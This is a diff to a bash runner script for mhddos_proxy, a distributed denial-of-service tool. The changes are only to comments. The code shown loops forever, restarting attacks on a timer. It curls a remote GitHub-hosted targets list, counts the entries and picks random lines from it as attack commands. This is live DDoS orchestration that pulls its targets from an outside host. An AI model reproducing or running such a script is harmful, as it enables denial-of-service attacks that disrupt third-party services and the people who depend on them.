@@ -68,7 +68,7 @@ sleep 7s
 
 
 
-# Restart attacks and update targets list every 10 minutes (by default)
+# Restarts attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
 	cd ~/mhddos_proxy
@@ -110,7 +110,6 @@ do
 	#
    	sleep 3s
 	
-   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
 	
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
@@ -146,7 +145,7 @@ do
    	for i in $random_numbers
    	do
             echo -e "\n I = $i"
-            # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
+             # Filter and only get lines that not start with "#". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
 
